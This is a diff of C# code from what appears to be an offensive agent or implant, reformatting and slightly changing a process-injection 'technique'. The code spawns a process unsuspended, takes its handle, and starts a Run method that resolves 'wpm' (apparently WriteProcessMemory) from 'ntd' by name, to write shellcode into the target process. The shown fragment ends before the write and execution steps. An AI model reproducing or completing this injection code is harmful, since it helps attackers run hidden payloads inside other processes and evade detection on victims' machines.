@@ -14,34 +14,38 @@ namespace Agent
     {
         int ITechnique.id => 4;
 
-            async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        {
+            spawnOptions.suspended = false;
+            if (!await spawner.Spawn(spawnOptions))
             {
-                if (!await spawner.Spawn(spawnOptions))
-                {
-                    return false;
-                }
-                SafeProcessHandle hProc;
-                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
-                {
-                    return false;
-                }
+                return false;
+            }
+            SafeProcessHandle hProc;
 
-                return Run(hProc.DangerousGetHandle(), shellcode);
+            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
+            {
+                return false;
             }
 
-            private bool Run(IntPtr htarger, byte[] shellcode)
+            return Run(hProc.DangerousGetHandle(), shellcode);
+        }
+
+        private bool Run(IntPtr htarger, byte[] shellcode)
+        {
+
+            List<string> resolveFuncs = new List<string>()
             {
 
-                List<string> resolveFuncs = new List<string>()
-            {
-           
                "wpm"
             };
 
-                if (!Resolver.TryResolveFuncs(resolveFuncs, "ntd", out var err))
-                {
-                    return false;
-                }
+            if (!Resolver.TryResolveFuncs(resolveFuncs, "ntd", out var err))
+            {
+                return false;
+            }
+
+
 
             IntPtr hProcess = htarger;
             int processId = GetProcessId(hProcess);
